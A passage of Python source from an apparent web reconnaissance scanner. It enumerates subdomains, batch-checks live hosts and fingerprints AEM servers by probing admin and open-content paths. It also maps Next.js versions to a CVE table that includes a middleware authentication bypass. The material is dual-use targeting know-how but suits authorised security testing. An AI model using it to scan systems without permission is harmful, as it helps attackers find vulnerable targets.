                        _send_ws(scan, {"type": "log", "level": "info",
                                        "message": f"CertSpotter: rate limited on page {cs_page+1}, stopping"})
                        break
                    if r.status_code != 200 or not r.content:
                        break
                    certs = r.json()
                    if not isinstance(certs, list) or not certs:
                        break
                    for cert in certs:
                        for name in cert.get("dns_names", []):
                            name = name.strip().lstrip("*.")
                            if name and name.endswith(d):
                                _add_sub(name, "certspotter")
                    cs_after = certs[-1].get("id")
                    if not cs_after:
                        break
                except requests.exceptions.Timeout:
                    continue
                except Exception:
                    break
            _send_ws(scan, {"type": "log", "level": "info",
                            "message": f"CertSpotter ({cs_page+1} pages): +{count - cs_before} new (total: {count})"})
        except Exception as e:
            _send_ws(scan, {"type": "log", "level": "info",
                            "message": f"CertSpotter: failed ({type(e).__name__})"})
            log.warning("CertSpotter error: %s", e)

    # ══════════════════════════════════════════════════════════════════
    # SOURCE 15: URLScan.io API (crowd-sourced URL scanning)
    # Returns recently-scanned subdomains. Paginated with search_after.
    # ══════════════════════════════════════════════════════════════════
    if not scan.cancelled:
        try:
            _send_ws(scan, {"type": "log", "level": "info",
                            "message": "Querying URLScan.io..."})
            us_before = count
            us_url = f"https://urlscan.io/api/v1/search/?q=domain:{d}&size=100"
            r = requests.get(us_url, timeout=30, headers={"User-Agent": "Mozilla/5.0"})
            if r.status_code == 200 and r.content:
                us_data = r.json()
                for result in us_data.get("results", []):
                    if scan.cancelled:
                        break
                    page_domain = result.get("page", {}).get("domain", "")
                    if page_domain and page_domain.endswith(d):
                        _add_sub(page_domain, "urlscan")
            _send_ws(scan, {"type": "log", "level": "info",
                            "message": f"URLScan.io: +{count - us_before} new (total: {count})"})
        except Exception as e:
            _send_ws(scan, {"type": "log", "level": "info",
                            "message": f"URLScan.io: failed ({type(e).__name__})"})
            log.warning("URLScan.io error: %s", e)

    # Deduplicate final list
    scan.subdomains = list(dict.fromkeys(scan.subdomains))

    _send_ws(scan, {
        "type": "progress",
        "phase": 1,
        "current": len(scan.subdomains),
        "total": len(scan.subdomains),
        "message": f"Enumeration complete: {len(scan.subdomains)} unique subdomains",
    })
    _send_ws(scan, {
        "type": "phase",
        "phase": 1,
        "name": "Subdomain Enumeration",
        "status": "complete",
        "count": len(scan.subdomains),
    })
    log.info("Phase 1 complete: %d subdomains", len(scan.subdomains))


# ============================================================================
# PHASE 2: ALIVE CHECK
# ============================================================================
def phase2_alive(scan: ScanState) -> None:
    """Run httpx to filter alive hosts."""
    targets = scan.subdomains if scan.subdomains else scan.urls
    if not targets:
        _send_ws(scan, {
            "type": "phase",
            "phase": 2,
            "name": "Alive Check",
            "status": "skipped",
            "message": "No targets to probe",
        })
        return

    _send_ws(scan, {
        "type": "phase",
        "phase": 2,
        "name": "Alive Check",
        "status": "running",
    })
    scan.phase = ScanPhase.ALIVE

    # ── Resume support: skip subdomains already processed in a prior run ──
    resume_from = scan.phase2_cursor
    if resume_from > 0 and resume_from < len(targets):
        log.info(
            "Phase 2: resuming from cursor %d/%d — skipping %d already-checked targets",
            resume_from, len(targets), resume_from,
        )
        _send_ws(scan, {
            "type": "log", "level": "info",
            "message": (
                f"↩ Resuming Phase 2 from target {resume_from:,}/{len(targets):,} "
                f"(skipping {resume_from:,} already-checked, "
                f"{len(scan.alive_hosts):,} alive found so far)"
            ),
        })
        targets = targets[resume_from:]
    elif resume_from >= len(targets):
        # All targets already checked — jump straight to complete
        log.info("Phase 2: cursor %d >= total %d — marking complete", resume_from, len(targets))
        _send_ws(scan, {
            "type": "phase", "phase": 2, "name": "Alive Check",
            "status": "complete", "count": len(scan.alive_hosts),
            "message": "All targets already checked (resumed)",
        })
        return

    total_targets = len(targets)   # remaining targets after cursor
    log.info("Phase 2: Probing %d targets for alive hosts", total_targets)

    httpx_bin = find_go_httpx()
    if not httpx_bin:
        log.warning("httpx not found, normalizing URLs directly")
        _send_ws(scan, {
            "type": "progress",
            "phase": 2,
            "current": 0,
            "total": len(targets),
            "message": "httpx not found — using raw URLs (no alive filtering)",
        })
        scan.alive_hosts = [u for u in (normalize_url(t) for t in targets) if u]
        for host in scan.alive_hosts:
            _send_ws(scan, {
                "type": "host_found",
                "phase": 2,
                "host": host,
                "status": "assumed_alive",
            })
        _send_ws(scan, {
            "type": "phase",
            "phase": 2,
            "name": "Alive Check",
            "status": "complete",
            "count": len(scan.alive_hosts),
        })
        return

    log.info("Using httpx binary: %s", httpx_bin)

    # ── Batched parallel alive check for 100K+ targets ──
    # Split targets into batches and run multiple httpx processes
    # concurrently for massive speed improvement.
    # total_targets already set above (remaining after cursor skip)
    BATCH_SIZE = 5000                   # hosts per httpx process
    HTTPX_THREADS = 200                 # threads inside each httpx
    HTTPX_TIMEOUT_PER_HOST = 5          # seconds per host connection
    MAX_CONCURRENT_BATCHES = 4          # parallel httpx processes
    BATCH_WATCHDOG_TIMEOUT = 180        # kill a batch after 3 min

    batches = [targets[i:i + BATCH_SIZE] for i in range(0, total_targets, BATCH_SIZE)]
    total_batches = len(batches)

    log.info("Phase 2: %d targets → %d batches of %d, %d concurrent, %d threads each",
             total_targets, total_batches, BATCH_SIZE, MAX_CONCURRENT_BATCHES, HTTPX_THREADS)
    _send_ws(scan, {"type": "log", "level": "info",
                    "message": f"Alive check: {total_targets} targets → {total_batches} batches, {MAX_CONCURRENT_BATCHES} parallel, {HTTPX_THREADS} threads each"})

    checked_count = 0           # total hosts checked so far
    alive_count = 0             # total alive found
    checked_lock = threading.Lock()

    def _run_batch(batch_idx: int, batch_hosts: list[str]) -> list[str]:
        """Run httpx on one batch and return alive URLs."""
        nonlocal checked_count, alive_count
        alive = []

        # ── Internet check: pause here if offline, resume when back ──
        ctx = f"Phase 2 batch {batch_idx + 1}/{total_batches} ({batch_idx * BATCH_SIZE}/{total_targets} checked)"
        if not _wait_for_internet(scan, ctx):
            return alive   # scan was cancelled while waiting

        try:
            proc = subprocess.Popen(
                [httpx_bin, "-silent", "-no-color",
                 "-threads", str(HTTPX_THREADS),
                 "-timeout", str(HTTPX_TIMEOUT_PER_HOST),
                 "-rate-limit", "500"],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                text=True,
            )

            # Watchdog for this batch
            batch_killed = False
            def _batch_wd():
                nonlocal batch_killed
                time.sleep(BATCH_WATCHDOG_TIMEOUT)
                if proc.poll() is None:
                    batch_killed = True
                    try:
                        proc.kill()
                    except Exception:
                        pass
            wd = threading.Thread(target=_batch_wd, daemon=True)
            wd.start()

            proc.stdin.write("\n".join(batch_hosts))
            proc.stdin.close()

            for line in proc.stdout:
                if scan.cancelled:
                    proc.kill()
                    return alive
                if batch_killed:
                    break
                line = line.strip()
                if not line:
                    continue
                url = line.split(" ")[0].strip()
                if url and url.startswith(("http://", "https://")):
                    alive.append(url)
                    with checked_lock:
                        alive_count += 1
                        scan.alive_hosts.append(url)
                    _send_ws(scan, {
                        "type": "host_found",
                        "phase": 2,
                        "host": url,
                        "status": "alive",
                    })

            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()

            # Update progress after batch completes
            with checked_lock:
                checked_count += len(batch_hosts)
                current_checked = checked_count
                current_alive = alive_count
                # Advance cursor: resume_from is the offset we started from;
                # checked_count is how many we've done in THIS run.
                scan.phase2_cursor = resume_from + checked_count

            pct = int(current_checked / total_targets * 100)
            _send_ws(scan, {
                "type": "progress",
                "phase": 2,
                "current": current_alive,
                "total": total_targets,
                "message": f"Checked {current_checked}/{total_targets} ({pct}%) — {current_alive} alive",
            })
            _send_ws(scan, {"type": "log", "level": "info",
                            "message": f"Batch {batch_idx+1}/{total_batches}: checked {len(batch_hosts)}, +{len(alive)} alive — total: {current_checked}/{total_targets} ({pct}%)"})

            if batch_killed:
                log.info("Batch %d killed by watchdog after %ds", batch_idx+1, BATCH_WATCHDOG_TIMEOUT)

        except FileNotFoundError:
            log.warning("httpx not found in batch %d", batch_idx+1)
        except Exception as e:
            log.warning("Batch %d error: %s", batch_idx+1, e)
        return alive

    try:
        # Run batches with thread pool for concurrency
        from concurrent.futures import ThreadPoolExecutor, as_completed
        with ThreadPoolExecutor(max_workers=MAX_CONCURRENT_BATCHES) as pool:
            futures = {
                pool.submit(_run_batch, i, batch): i
                for i, batch in enumerate(batches)
            }
            for future in as_completed(futures):
                if scan.cancelled:
                    pool.shutdown(wait=False, cancel_futures=True)
                    break
                try:
                    future.result()
                except Exception as e:
                    log.warning("Batch future error: %s", e)

        _send_ws(scan, {
            "type": "phase",
            "phase": 2,
            "name": "Alive Check",
            "status": "complete",
            "count": len(scan.alive_hosts),
        })
        log.info("Phase 2 complete: %d alive hosts out of %d checked", len(scan.alive_hosts), total_targets)

    except Exception as e:
        log.warning("Phase 2 batch executor error: %s", e)
        _send_ws(scan, {
            "type": "phase",
            "phase": 2,
            "name": "Alive Check",
            "status": "complete",
            "count": len(scan.alive_hosts),
            "message": f"Completed with errors: {e}",
        })
    except Exception as e:
        log.error("httpx error: %s", e)
        scan.alive_hosts = [u for u in (normalize_url(t) for t in targets) if u]
        _send_ws(scan, {
            "type": "phase",
            "phase": 2,
            "name": "Alive Check",
            "status": "complete",
            "count": len(scan.alive_hosts),
            "message": f"httpx error ({e}); using unfiltered list",
        })


# ============================================================================
# PHASE 3: AEM DETECTION (multi-signal fingerprinting)
# ============================================================================
def detect_aem_host(
    base_url: str, scan: ScanState, timeout: int = DEFAULT_TIMEOUT
) -> tuple[str, int, list[str]]:
    """
    Probe a single host with multi-method AEM fingerprinting.

    Methods:
      A: Source code / HTML analysis (+5 each)
      B: Response headers (+4 each)
      C: Path fingerprinting (+3 each)
      D: AEM-specific content patterns (+5 each)
      E: JavaScript console objects (+3 each)
      F: Sample content check (+5 each)

    Returns: (confidence, score, reasons)
    """
    score = 0
    reasons: list[str] = []
    seen_headers: set[str] = set()
    homepage_body = ""

    # Track helix-rum-js presence (checked later for Edge Delivery classification)
    _has_helix_rum = False

    # ─── STEP 1: Fetch homepage FIRST (strongest signal, before WAF triggers) ───
    # WAFs like Akamai can start blocking after seeing suspicious AEM paths,
    # so we fetch the homepage before any probing to ensure we get the HTML.
    try:
        hp = requests.get(
            base_url + "/",
            headers=HEADERS,
            timeout=timeout,
            verify=False,
            allow_redirects=True,
        )
        if hp.status_code == 200 and len(hp.content) > 100:
            homepage_body = hp.text

            # --- Method A: Homepage HTML analysis (+5 each) ---
            for pattern, reason_tag in HTML_ANALYSIS_PATTERNS:
                if re.search(pattern, homepage_body, re.IGNORECASE):
                    score += 5
                    reasons.append(reason_tag)

            # --- Method B: Response headers on homepage (+4 each) ---
            for hdr in hp.headers:
                h_lo = hdr.lower()
                if h_lo in AEM_DETECT_HEADERS and h_lo not in seen_headers:
                    score += 4
                    reasons.append(f"header:{hdr}")
                    seen_headers.add(h_lo)

            # Check if Server is Apache (weaker signal, only counts with others)
            server_hdr = hp.headers.get("Server", "").lower()
            if "apache" in server_hdr and score > 0:
                score += 2
                reasons.append("header:Server:Apache")

            # Detect helix-rum-js (could be Edge Delivery OR just analytics on AEM)
            if "helix-rum-js" in homepage_body:
                _has_helix_rum = True

    except Exception:
        pass

    # ─── STEP 2: Baseline probes (catch-all detection) ───
    # Hit 2 random nonsense paths. If both return the SAME status code,
    # that status is the "catch-all status" — any AEM path returning
    # that same status is NOT a real AEM signal.
    robots_status = 0
    try:
        rr = requests.get(
            base_url + "/robots.txt",
            headers=HEADERS,
            timeout=6,
            verify=False,
            allow_redirects=False,
        )
        robots_status = rr.status_code
    except Exception:
        pass

    probe_status_1 = 0
    probe_status_2 = 0
    probe_location_1 = ""
    probe_location_2 = ""
    is_catchall = False
    is_blockall = False
    catchall_status: set[int] = set()
    baseline_sizes: list[int] = []
    try:
        r0 = requests.get(
            base_url + "/aem-detect-probe-xyz789-notexist.json",
            headers=HEADERS,
            timeout=7,
            verify=False,
            allow_redirects=False,
        )
        probe_status_1 = r0.status_code
        probe_location_1 = r0.headers.get("Location", "").lower()
        if probe_status_1 == 200:
            baseline_sizes.append(len(r0.content))

        r0b = requests.get(
            base_url + "/probe-rng-aem-detect-zzz456-none.html",
            headers=HEADERS,
            timeout=7,
            verify=False,
            allow_redirects=False,
        )
        probe_status_2 = r0b.status_code
        probe_location_2 = r0b.headers.get("Location", "").lower()
        if probe_status_2 == 200:
            baseline_sizes.append(len(r0b.content))

        # If both probes return the same status, it's a catch-all for that status
        if probe_status_1 == probe_status_2 and probe_status_1 != 0:
            is_catchall = True
            catchall_status.add(probe_status_1)
            # Also treat redirect-to-same-location as catch-all
            if probe_status_1 in (301, 302, 307, 308):
                catchall_status.add(301)
                catchall_status.add(302)
                catchall_status.add(307)
                catchall_status.add(308)

        # Detect block-all (403 on everything)
        is_blockall = (probe_status_1 == 403 and probe_status_2 == 403
                       and robots_status != 200)

        # Check catch-all body for AEM sigs (rare but possible)
        if is_catchall and probe_status_1 == 200 and len(r0.content) > 50:
            body_lower = r0.text.lower()
            for sig in AEM_BODY_SIGS_DETECT:
                if sig.lower() in body_lower:
                    score += 3
                    reasons.append(f"catchall-body:{sig[:22]}")
                    break
    except Exception:
        pass

    # Helper: check if a status matches the catch-all pattern
    def _is_catchall_response(status_code, location=""):
        """Return True if this response matches what the control probe got."""
        if not is_catchall:
            return False
        if status_code in catchall_status:
            return True
        # Redirect to the same location as the control probe
        if (status_code in (301, 302, 307, 308)
                and probe_status_1 in (301, 302, 307, 308)):
            if location and probe_location_1:
                # Same redirect target = catch-all
                if location.rstrip("/") == probe_location_1.rstrip("/"):
                    return True
            return True  # same class of redirect
        # 4xx/5xx matching control probe status exactly (even if not strict catchall)
        if status_code == probe_status_1 == probe_status_2 and status_code != 0:
            return True
        return False

    # --- Method D: AEM body patterns on homepage (+5 each) ---
    if homepage_body:
        body_lower = homepage_body.lower()
        d_patterns = [
            ("jcr:primaryType", "body:jcr:primaryType"),
            ("sling:resourceType", "body:sling:resourceType"),
            ("cq:Page", "body:cq:Page"),
            ("adobe experience manager", "body:adobe-experience-manager"),
            ("j_username", "body:j_username"),
            ("/etc.clientlibs/", "body:/etc.clientlibs/"),
        ]
        for pat, reason_tag in d_patterns:
            if pat.lower() in body_lower:
                score += 5
                reasons.append(reason_tag)

    # --- Method E: JavaScript console objects (+3 each) ---
    if homepage_body:
        for pattern, reason_tag in JS_OBJECT_PATTERNS:
            if re.search(pattern, homepage_body):
                score += 3
                reasons.append(reason_tag)

    # --- Method C: Path fingerprinting ---
    # CRITICAL: Skip scoring if the response matches the catch-all pattern.
    # A real AEM server returns DIFFERENT responses for AEM paths vs random paths.
    # A catch-all returns the SAME response for everything.
    for path, name in AEM_DETECT_PATHS:
        if scan.cancelled:
            break
        try:
            r = requests.get(
                base_url + path,
                headers=HEADERS,
                timeout=7,
                verify=False,
                allow_redirects=False,
            )
            resp_loc = r.headers.get("Location", "").lower()

            # Method B: Response headers on every probe (+4 each)
            # Headers are ALWAYS checked — they're independent of catch-all
            for hdr in r.headers:
                h_lo = hdr.lower()
                if h_lo in AEM_DETECT_HEADERS and h_lo not in seen_headers:
                    score += 4
                    reasons.append(f"header:{hdr}")
                    seen_headers.add(h_lo)

            # ── Skip scoring if this response matches the catch-all ──
            if _is_catchall_response(r.status_code, resp_loc):
                continue  # same as random path → not an AEM signal

            # 403 on AEM-specific paths (not a blanket block)
            if r.status_code == 403 and not is_blockall:
                score += 3
                reasons.append(f"403:{name}")

            # 200 with AEM-specific body content
            elif r.status_code == 200 and len(r.content) > 50:
                # If is_catchall with 200, check body differs from baseline
                if is_catchall and baseline_sizes:
                    if all(abs(len(r.content) - bs) < 200 for bs in baseline_sizes):
                        continue  # same body as random path
                body_lower = r.text.lower()
                waf_block = any(s in body_lower for s in [
                    "request rejected", "access denied", "incapsula",
                    "you have been blocked", "cloudflare ray id"
                ])
                if not waf_block:
                    for sig in AEM_BODY_SIGS_DETECT:
                        if sig.lower() in body_lower:
                            score += 5
                            reasons.append(f"body:{sig[:22]}")
                            break

                    if name == "content-json" and '"jcr:primarytype"' in body_lower:
                        score += 5
                        reasons.append("open-jcr:content.json")

                    if name in ("dam-json", "dam-ext-json", "dam-childrenlist", "dam-www-json") and ("jcr:" in body_lower or "[{" in r.text[:5]):
                        score += 5
                        reasons.append(f"open-dam:{name}")

            # 301/302 redirect — only count if redirect points to AEM-specific login
            if r.status_code in (301, 302) and not is_blockall:
                loc = r.headers.get("Location", "")
                loc_lo = loc.lower()
                # Only score if redirect target is AEM-specific
                if any(aem_sig in loc_lo for aem_sig in [
                    "/libs/granite", "/content/", "login.html",
                    "system/sling/logout", "/crx/"
                ]):
                    score += 3
                    reasons.append(f"auth-redirect:{name}")
                # Generic login/auth/sso redirects get LOW weight and only
                # if redirect target is DIFFERENT from the catch-all target
                elif ("login" in loc_lo or "auth" in loc_lo or "sso" in loc_lo):
                    if not probe_location_1 or loc_lo.rstrip("/") != probe_location_1.rstrip("/"):
                        score += 1
                        reasons.append(f"auth-redirect:{name}")
                # Generic 301 to homepage or same location — NO POINTS
                # (this eliminates the +11 points from catch-all redirectors)

        except Exception:
            pass

    # --- Method F: Sample content check (+5 each) ---
    for path, name in SAMPLE_CONTENT_PATHS:
        if scan.cancelled:
            break
        try:
            r = requests.get(
                base_url + path,
                headers=HEADERS,
                timeout=7,
                verify=False,
                allow_redirects=False,
            )
            if r.status_code == 200 and len(r.content) > 100:
                # Verify it's not a catch-all by checking body
                if not is_catchall or (
                    baseline_sizes
                    and all(abs(len(r.content) - bs) > 200 for bs in baseline_sizes)
                ):
                    score += 5
                    reasons.append(name)
        except Exception:
            pass

    # --- Confidence thresholds ---
    # Edge Delivery Services: has helix-rum-js but NO traditional AEM signals.
    # Traditional AEM sites also embed helix-rum-js for analytics — only flag
    # as Edge Delivery when there are no /etc.clientlibs/ or other strong signals.
    if _has_helix_rum and score < 5:
        reasons.append("edge-delivery:helix-rum-js")
        return "edge_delivery", score, reasons

    if score >= 10:
        return "confirmed", score, reasons
    elif score >= 5:
        return "suspected", score, reasons
    else:
        return "not_aem", score, reasons


# ============================================================================
# NEXT.JS DETECTION ENGINE
# ============================================================================

def _extract_nextjs_version_from_js(js: str) -> str | None:
    """
    Try multiple regex patterns to extract a Next.js semver from a JS bundle.
    Returns the version string or None.
    """
    # High-specificity patterns: unambiguously Next.js
    specific_patterns = [
        # Explicit next version in JSON-style chunk manifest
        r'"next":\s*"(\d+\.\d+\.\d+(?:-[\w.]+)?)"',
        # next@14.0.0 style package reference
        r"next@(\d+\.\d+\.\d+(?:-[\w.]+)?)",
        # __NEXT_VERSION__ constant
        r'__NEXT_VERSION__\s*[=:]\s*["\'](\d+\.\d+\.\d+(?:-[\w.]+)?)["\']',
        # version in package.json style object near "The React Framework" description
        r'"version"\s*:\s*"(\d+\.\d+\.\d+(?:-[\w.]+)?)"[^}]{0,200}?"The React Framework',
        r'"The React Framework[^"]{0,80}"[^}]{0,200}?"version"\s*:\s*"(\d+\.\d+\.\d+(?:-[\w.]+)?)"',
        # nextVersion = "14.0.0"
        r'nextVersion\s*=\s*["\'](\d+\.\d+\.\d+(?:-[\w.]+)?)["\']',
        r'\.nextVersion\s*=\s*["\'](\d+\.\d+\.\d+(?:-[\w.]+)?)["\']',
        # "nextVersion":"14.0.0"  (in __NEXT_DATA__ runtimeConfig)
        r'"nextVersion"\s*:\s*"(\d+\.\d+\.\d+(?:-[\w.]+)?)"',
        # "next.js":"14.0.0" or "nextjs":"14.0.0"
        r'"next\.?js"\s*:\s*"(\d+\.\d+\.\d+(?:-[\w.]+)?)"',
        # Webpack comment: /* next 14.0.0 */
        r'/\*+\s*next\s+v?(\d+\.\d+\.\d+(?:-[\w.]+)?)\s*\*+/',
        # Inline comment: // next.js 14.0.0  or  // Next.js v14.0.0
        r'//\s*[Nn]ext\.js\s+v?(\d+\.\d+\.\d+(?:-[\w.]+)?)',
        # self.__next_s = {...,"version":"14.2.1",...}
        r'self\.__next_s\s*=.*?"version"\s*:\s*"(\d+\.\d+\.\d+(?:-[\w.]+)?)"',
        # e.g. var h="14.2.3",g=... or t.version="14.2.3" after next-identifiers
        r'(?:__next|NEXT_DATA|__nextRouter)\S{0,30}"(\d+\.\d+\.\d+(?:-[\w.]+)?)"',
    ]
    for pattern in specific_patterns:
        m = re.search(pattern, js, re.DOTALL)
        if m:
            ver = m.group(1)
            try:
                major = int(ver.split(".")[0])
                if 9 <= major <= 25:
                    return ver
            except ValueError:
                pass

    # Last resort: generic "version":"X.Y.Z" with React context exclusion
    for m in re.finditer(r'"version"\s*:\s*"(\d+\.\d+\.\d+(?:-[\w.]+)?)"', js):
        ver = m.group(1)
        try:
            major = int(ver.split(".")[0])
            if not (9 <= major <= 25):
                continue
        except ValueError:
            continue
        # Check ±300 chars of surrounding context for React/non-Next identifiers
        start = max(0, m.start() - 300)
        end = min(len(js), m.end() + 300)
        ctx = js[start:end].lower()
        skip_indicators = [
            '"react"', 'react.production', 'reactdom', '"react-dom"',
            '"scheduler"', '"prop-types"', 'object.assign', '"loose-envify"',
            '"use-sync-external-store"', '"use-subscription"',
        ]
        if any(ind in ctx for ind in skip_indicators):
            continue
        return ver

    return None


def _extract_react_version_from_js(js: str) -> str | None:
    """Extract React version from a JS bundle (used for Next.js version inference)."""
    patterns = [
        # Chunk manifest style: "react": "19.2.3"
        r'"react":\s*"(\d+\.\d+\.\d+(?:-[\w.]+)?)"',
        r'"react-dom":\s*"(\d+\.\d+\.\d+(?:-[\w.]+)?)"',
        # Package reference: react@19.2.3
        r'react@(\d+\.\d+\.\d+(?:-[\w.]+)?)',
        # ReactDOM compatibility check (unique to React): if("19.2.3"!==cU)throw Error(...)
        r'if\s*\(\s*"(\d+\.\d+\.\d+(?:-[\w.]+)?)"!==\w{1,4}\s*\)\s*throw\s+',
        # Minified webpack module export: t.version="19.2.3"},NUMBER: — React API module
        r'\.version\s*=\s*"(\d+\.\d+\.\d+(?:-[\w.]+)?)"[},]\s*\d+\s*:',
        # React hooks context: .useTransition=function ... .version="19.2.3"
        r'useTransition[^"]{0,300}?\.version\s*=\s*"(\d+\.\d+\.\d+(?:-[\w.]+)?)"',
        # React production banner: react.production.min.js
        r'react\.production\S{0,30}?["\'](\d+\.\d+\.\d+(?:-[\w.]+)?)["\']',
    ]
    for p in patterns:
        m = re.search(p, js, re.DOTALL)
        if m:
            ver = m.group(1)
            try:
                major = int(ver.split('.')[0])
                if 15 <= major <= 25:
                    return ver
            except ValueError:
                pass
    return None


# React major version → Next.js version range (approximate — use when exact version stripped)
_REACT_TO_NEXTJS_RANGE: dict[int, str] = {
    19: "~15.x",
    18: "~12.x–14.x",
    17: "~10.x–11.x",
    16: "~9.x–10.x",
}


# ============================================================================
# NEXT.JS CVE VULNERABILITY DATABASE
# ============================================================================
# Each entry: affected_ranges is a list of dicts with optional keys:
#   "lt"  → version < lt  is affected
#   "gte" → version >= gte  (lower bound, defaults to 0.0.0 if omitted)
# All ranges in the list are OR'd together.
NEXTJS_VULN_DB: list[dict[str, Any]] = [
    {
        "cve":        "CVE-2025-29927",
        "severity":   "CRITICAL",
        "cvss":       9.1,
        "title":      "Middleware Authentication Bypass",
        "description": (
            "An attacker can bypass middleware-based authentication/authorization by "
            "setting the internal x-middleware-subrequest header. Affects all Next.js "
            "versions that use middleware for access control."
        ),
        "affected_ranges": [
            {"lt": "12.3.5"},
            {"gte": "13.0.0", "lt": "13.5.9"},
            {"gte": "14.0.0", "lt": "14.2.25"},
            {"gte": "15.0.0", "lt": "15.2.3"},
        ],
        "fixed_in":        ["12.3.5", "13.5.9", "14.2.25", "15.2.3"],
        "nuclei_template": "http/cves/2025/CVE-2025-29927.yaml",
        "nuclei_repo":     "https://github.com/projectdiscovery/nuclei-templates",
        "references": [
            "https://github.com/advisories/GHSA-f82v-jwr5-mffw",
            "https://nvd.nist.gov/vuln/detail/CVE-2025-29927",
        ],
    },
    {
        "cve":        "CVE-2024-46982",
        "severity":   "HIGH",
        "cvss":       7.5,
        "title":      "Cache Poisoning via Crafted Request",
        "description": (
            "Attackers can perform cache poisoning by crafting requests with manipulated "
            "Host headers, potentially serving malicious content to other users."
        ),
        "affected_ranges": [
            {"lt": "13.5.7"},
            {"gte": "14.0.0", "lt": "14.2.10"},
        ],
        "fixed_in":        ["13.5.7", "14.2.10"],
        "nuclei_template": "http/cves/2024/CVE-2024-46982.yaml",
        "nuclei_repo":     "https://github.com/projectdiscovery/nuclei-templates",
        "references": [
            "https://github.com/advisories/GHSA-gp8f-8m3g-qvj9",
            "https://nvd.nist.gov/vuln/detail/CVE-2024-46982",
        ],
    },
    {
        "cve":        "CVE-2024-34351",
        "severity":   "HIGH",
        "cvss":       7.5,
        "title":      "SSRF via Host Header in Server Actions",
        "description": (
            "A Server-Side Request Forgery (SSRF) vulnerability in Next.js Server Actions "
            "allows attackers to proxy internal requests via a malicious Host header."
        ),
        "affected_ranges": [
            {"gte": "14.0.0", "lt": "14.1.1"},
        ],
        "fixed_in":        ["14.1.1"],
        "nuclei_template": "http/cves/2024/CVE-2024-34351.yaml",
        "nuclei_repo":     "https://github.com/projectdiscovery/nuclei-templates",
        "references": [
            "https://github.com/advisories/GHSA-fr5h-rqp8-mj6g",
            "https://nvd.nist.gov/vuln/detail/CVE-2024-34351",
        ],
    },
    {
        "cve":        "CVE-2024-56332",
        "severity":   "HIGH",
        "cvss":       8.1,
        "title":      "SSRF via Image Optimization Endpoint",
        "description": (
            "The Next.js image optimization API (/_next/image) can be abused to perform "
            "Server-Side Request Forgery against internal network services."
        ),
        "affected_ranges": [
            {"lt": "15.1.0"},
        ],
        "fixed_in":        ["15.1.0"],
        "nuclei_template": "http/cves/2024/CVE-2024-56332.yaml",
        "nuclei_repo":     "https://github.com/projectdiscovery/nuclei-templates",
        "references": [
            "https://github.com/advisories/GHSA-7m27-7ghc-44w9",
            "https://nvd.nist.gov/vuln/detail/CVE-2024-56332",
        ],
    },
    {
        "cve":        "CVE-2025-32421",
        "severity":   "MEDIUM",
        "cvss":       5.3,
        "title":      "ReDoS via Path Parameter",
        "description": (
            "A Regular Expression Denial of Service (ReDoS) vulnerability allows an "
            "unauthenticated attacker to cause excessive CPU consumption via crafted URL paths."
        ),
        "affected_ranges": [
            {"lt": "14.2.26"},
            {"gte": "15.0.0", "lt": "15.1.7"},
        ],
        "fixed_in":        ["14.2.26", "15.1.7"],
        "nuclei_template": "http/cves/2025/CVE-2025-32421.yaml",
        "nuclei_repo":     "https://github.com/projectdiscovery/nuclei-templates",
        "references": [
            "https://github.com/advisories/GHSA-qpjv-v95h-7gx9",
            "https://nvd.nist.gov/vuln/detail/CVE-2025-32421",
        ],
    },
    {
        "cve":        "CVE-2025-32280",
        "severity":   "MEDIUM",
        "cvss":       5.9,
        "title":      "Denial of Service — Infinite Loop in App Router",
        "description": (
            "A specially crafted URL can trigger an infinite redirect loop in the App Router, "
            "causing a Denial of Service against the Next.js server."
        ),
        "affected_ranges": [
            {"lt": "14.2.30"},
            {"gte": "15.0.0", "lt": "15.2.4"},
        ],
        "fixed_in":        ["14.2.30", "15.2.4"],
        "nuclei_template": "http/cves/2025/CVE-2025-32280.yaml",
        "nuclei_repo":     "https://github.com/projectdiscovery/nuclei-templates",
        "references": [
            "https://github.com/advisories/GHSA-99xm-8vf3-v56r",
            "https://nvd.nist.gov/vuln/detail/CVE-2025-32280",
        ],
    },
]


def _parse_semver(version: str) -> tuple[int, int, int] | None:
    """Parse 'X.Y.Z' into (major, minor, patch) ints. Returns None on failure."""
    # Strip leading ~ or = signs (inferred versions)
    version = version.lstrip("~=")
    # Handle ranges like "15.x" — not parseable
    if "x" in version.lower() or "–" in version or "-" in version.split(".")[-1]:
        return None
    m = re.match(r"^(\d+)\.(\d+)\.(\d+)", version)
    if m:
        return int(m.group(1)), int(m.group(2)), int(m.group(3))
    return None


def _semver_lt(a: tuple[int, int, int], b_str: str) -> bool:
    """Return True if semver tuple `a` < semver string `b_str`."""
    b = _parse_semver(b_str)
    return b is not None and a < b


def _semver_gte(a: tuple[int, int, int], b_str: str) -> bool:
    """Return True if semver tuple `a` >= semver string `b_str`."""
    b = _parse_semver(b_str)
    return b is not None and a >= b


def check_nextjs_vulns(version: str | None, version_inferred: bool = False) -> list[dict[str, Any]]:
    """
    Check a detected Next.js version against the CVE vulnerability database.

    For exact versions  → returns only definitively affected CVEs (possibly_affected=False).
    For inferred ranges → uses the earliest version in the inferred major (e.g. ~15.x → 15.0.0)
                          to determine which CVEs are plausibly applicable (possibly_affected=True).
    """
    if not version:
        return []

    parsed = _parse_semver(version)

    # For inferred ranges (e.g. "~15.x"), derive a best-case lower bound: MAJOR.0.0
    probe_version: tuple[int, int, int] | None = parsed
    if parsed is None or version_inferred:
        m = re.match(r"[~=]?(\d+)", version)
        probe_version = (int(m.group(1)), 0, 0) if m else None

    results: list[dict[str, Any]] = []
    seen_cves: set[str] = set()

    for vuln in NEXTJS_VULN_DB:
        cve_id = vuln["cve"]
        if cve_id in seen_cves:
            continue

        if probe_version is None:
            # Completely unparseable version — show everything as possibly affected
            results.append({**vuln, "possibly_affected": True})
            seen_cves.add(cve_id)
            continue

        for rng in vuln["affected_ranges"]:
            gte_str = rng.get("gte", "0.0.0")
            lt_str  = rng.get("lt")
            if lt_str and _semver_gte(probe_version, gte_str) and _semver_lt(probe_version, lt_str):
                results.append({**vuln, "possibly_affected": version_inferred})
                seen_cves.add(cve_id)
                break

    return results


def detect_nextjs_host(base_url: str, timeout: int = 10) -> dict[str, Any]:
    """
    Comprehensive Next.js detection across 8 methods.

    Returns a dict:
        detected    bool
        version     str | None   — e.g. "14.2.3"
        build_id    str | None   — Next.js buildId
        router      str | None   — "pages" | "app" | "hybrid"
        confidence  str          — "confirmed" | "suspected" | "none"
        methods     list[str]    — which detection methods fired
